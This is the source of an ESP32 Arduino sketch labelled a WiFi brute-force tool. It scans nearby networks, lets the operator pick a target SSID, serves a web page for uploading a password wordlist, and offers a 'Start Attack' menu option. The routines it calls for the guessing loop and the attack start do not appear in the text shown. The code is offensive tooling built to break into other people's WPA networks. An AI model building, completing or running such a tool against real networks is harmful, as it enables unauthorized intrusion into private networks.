#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>

// ============= CONFIGURATION =============
const char* AP_SSID = "ESP32-Brute";
const char* AP_PASS = "brute1234";
const int ATTEMPT_DELAY = 300;

WebServer server(80);
bool isRunning = false;
String targetSSID = "";
int currentAttempt = 0;
int totalPasswords = 0;
String status = "Idle";
String currentPassword = "";
unsigned long lastAttempt = 0;
File passwordFile;

// Serial menu variables
String inputBuffer = "";
bool waitingForInput = true;
int selectedNetwork = -1;

// Network storage
struct NetworkInfo {
  String ssid;
  int rssi;
  String encryption;
  int channel;
};
NetworkInfo networks[50];
int networkCount = 0;

// ============= SETUP =============
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n╔══════════════════════════════════════════════╗");
  Serial.println("║     ESP32 WiFi Brute Force Tool v3.0       ║");
  Serial.println("║     Working Serial Menu                    ║");
  Serial.println("╚══════════════════════════════════════════════╝\n");
  
  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("[!] Formatting SPIFFS...");
    SPIFFS.format();
    SPIFFS.begin(true);
  }
  Serial.println("[✓] SPIFFS Ready");
  
  // Optimize WiFi
  WiFi.mode(WIFI_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  // Start Access Point
  WiFi.softAP(AP_SSID, AP_PASS);
  IPAddress IP = WiFi.softAPIP();
  
  Serial.print("[✓] AP Started: ");
  Serial.println(AP_SSID);
  Serial.print("[✓] AP Password: ");
  Serial.println(AP_PASS);
  Serial.print("[✓] Web Interface: http://");
  Serial.println(IP);
  Serial.println();
  
  // Setup web routes
  setupWebRoutes();
  server.begin();
  
  // Initial scan
  scanAndShowNetworks();
  showMenu();
}

void loop() {
  server.handleClient();
  
  if (isRunning) {
    bruteForceLoop();
  }
  
  // Handle serial input
  handleSerialInput();
}

// ============= PROPER SERIAL INPUT HANDLER =============
void handleSerialInput() {
  while (Serial.available() > 0) {
    char c = Serial.read();
    
    if (c == '\n' || c == '\r') {
      if (inputBuffer.length() > 0) {
        processCommand(inputBuffer);
        inputBuffer = "";
        if (!isRunning) {
          showMenu();
        }
      }
    } else {
      inputBuffer += c;
    }
  }
}

void processCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;
  
  Serial.println(); // New line for clean output
  
  int choice = cmd.toInt();
  
  switch(choice) {
    case 1:
      scanAndShowNetworks();
      break;
      
    case 2:
      selectNetworkByNumber();
      break;
      
    case 3:
      enterSSIDManually();
      break;
      
    case 4:
      showWebInterfaceInfo();
      break;
      
    case 5:
      startAttack();
      break;
      
    case 6:
      stopAttack();
      break;
      
    case 7:
      showStatus();
      break;
      
    case 8:
      listFiles();
      break;
      
    case 9:
      deleteWordlist();
      break;
      
    case 0:
      showMenu();
      break;
      
    default:
      Serial.println("[!] Invalid choice. Enter 0-9");
  }
}

// ============= MENU DISPLAY =============
void showMenu() {
  Serial.println("\n┌─────────────────────────────────────────┐");
  Serial.println("│              MAIN MENU                  │");
  Serial.println("├─────────────────────────────────────────┤");
  Serial.println("│ 1. Scan Networks Again                  │");
  Serial.println("│ 2. Select Network by Number             │");
  Serial.println("│ 3. Enter SSID Manually                  │");
  Serial.println("│ 4. Upload Wordlist (Web Interface)      │");
  Serial.println("│ 5. Start Attack                         │");
  Serial.println("│ 6. Stop Attack                          │");
  Serial.println("│ 7. Show Status                          │");
  Serial.println("│ 8. List Files in SPIFFS                 │");
  Serial.println("│ 9. Delete Wordlist                      │");
  Serial.println("│ 0. Show This Menu                       │");
  Serial.println("└─────────────────────────────────────────┘");
  Serial.print("\nEnter choice (0-9): ");
}

// ============= NETWORK SCANNER =============
void scanAndShowNetworks() {
  Serial.println("\n┌─────────────────────────────────────────┐");
  Serial.println("│         SCANNING WiFi NETWORKS          │");
  Serial.println("└─────────────────────────────────────────┘");
  Serial.print("Scanning");
  
  networkCount = 0;
  
  int n = WiFi.scanNetworks();
  
  for(int i = 0; i < 3; i++) {
    delay(300);
    Serial.print(".");
  }
  Serial.println();
  
  if (n == 0) {
    Serial.println("[!] No networks found.\n");
    return;
  }
  
  Serial.println("\n╔════╦════════════════════════════════════╦═════════╦════════════╗");
  Serial.println("║ No ║ SSID                               ║ Signal  ║ Encryption ║");
  Serial.println("╠════╬════════════════════════════════════╬═════════╬════════════╣");
  
  for (int i = 0; i < n && i < 50; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 0 && ssid.length() < 50) {
      int rssi = WiFi.RSSI(i);
      String encryption = getEncryptionType(WiFi.encryptionType(i));
      int channel = WiFi.channel(i);
      
      networks[networkCount].ssid = ssid;
      networks[networkCount].rssi = rssi;
      networks[networkCount].encryption = encryption;
      networks[networkCount].channel = channel;
      
      String signalBar = getSignalBar(rssi);
      String displaySSID = ssid;
      if (displaySSID.length() > 30) {
        displaySSID = displaySSID.substring(0, 27) + "...";
      }
      
      Serial.printf("║ %2d ║ %-30s ║ %3d %s ║ %-10s ║\n", 
        networkCount + 1,
        displaySSID.c_str(),
        rssi,
        signalBar.c_str(),
        encryption.c_str()
      );
      
      networkCount++;
    }
  }
  
  Serial.println("╚════╩════════════════════════════════════╩═════════╩════════════╝\n");
  Serial.printf("Found %d networks\n", networkCount);
  
  WiFi.scanDelete();
}

String getEncryptionType(wifi_auth_mode_t encryption) {
  switch(encryption) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    default: return "UNKNOWN";
  }
}

String getSignalBar(int rssi) {
  if (rssi > -50) return "█████";
  if (rssi > -60) return "████░";
  if (rssi > -70) return "███░░";
  if (rssi > -80) return "██░░░";
  return "█░░░░";
}

// ============= MENU FUNCTIONS =============
void selectNetworkByNumber() {
  if (networkCount == 0) {
    Serial.println("[!] No networks found. Scan first (option 1)");
    return;
  }
  
  Serial.print("Enter network number (1-" + String(networkCount) + "): ");
  
  // Wait for input
  String input = "";
  while (input.length() == 0) {
    while (Serial.available() > 0) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') {
        break;
      } else if (c >= '0' && c <= '9') {
        input += c;
      }
    }
    delay(100);
  }
  
  int num = input.toInt();
  
  if (num >= 1 && num <= networkCount) {
    selectedNetwork = num - 1;
    targetSSID = networks[selectedNetwork].ssid;
    
    Serial.println("\n┌─────────────────────────────────────────┐");
    Serial.println("│         NETWORK SELECTED               │");
    Serial.println("├─────────────────────────────────────────┤");
    Serial.print("│ SSID: ");
    Serial.print(targetSSID);
    for(int i = targetSSID.length(); i < 34; i++) Serial.print(" ");
    Serial.println("│");
    
    Serial.print("│ Signal: ");
    Serial.print(networks[selectedNetwork].rssi);
    Serial.print(" dBm ");
    Serial.print(getSignalBar(networks[selectedNetwork].rssi));
    Serial.println(" │");
    
    Serial.print("│ Encryption: ");
    Serial.print(networks[selectedNetwork].encryption);
    for(int i = networks[selectedNetwork].encryption.length(); i < 26; i++) Serial.print(" ");
    Serial.println("│");
    
    Serial.println("└─────────────────────────────────────────┘\n");
    Serial.println("[✓] Target set! Ready to attack.");
  } else {
    Serial.println("[!] Invalid number.");
  }
}

void enterSSIDManually() {
  Serial.print("Enter target SSID: ");
  
  String input = "";
  while (input.length() == 0) {
    while (Serial.available() > 0) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') {
        break;
      } else {
        input += c;
      }
    }
    delay(100);
  }
  
  targetSSID = input;
  targetSSID.trim();
  
  if (targetSSID.length() > 0) {
    Serial.println("\n┌─────────────────────────────────────────┐");
    Serial.println("│         TARGET SET MANUALLY            │");
    Serial.println("├─────────────────────────────────────────┤");
    Serial.print("│ SSID: ");
    Serial.print(targetSSID);
    for(int i = targetSSID.length(); i < 34; i++) Serial.print(" ");
    Serial.println("│");
    Serial.println("└─────────────────────────────────────────┘\n");
    Serial.println("[✓] Target set manually!");
  } else {
    Serial.println("[!] Invalid SSID.");
  }
}

